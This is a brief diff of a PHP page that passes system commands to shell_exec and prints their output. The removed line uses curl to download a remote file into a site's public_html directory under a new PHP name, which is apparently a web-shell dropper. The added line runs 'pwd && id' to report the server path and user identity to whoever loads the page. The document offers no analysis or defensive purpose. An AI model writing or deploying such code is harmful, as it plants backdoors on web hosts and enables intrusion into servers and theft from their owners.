@@ -1,8 +1,9 @@
 <?php
 echo "<pre>";
-echo shell_exec("curl https://raw.githubusercontent.com/sdfdfasd12/test/refs/heads/main/1.txt > /home3/tonychor/public_html/cqr1x.php");
+echo shell_exec("pwd && id");
 echo "</pre>";
 ?>
+
 
 
 
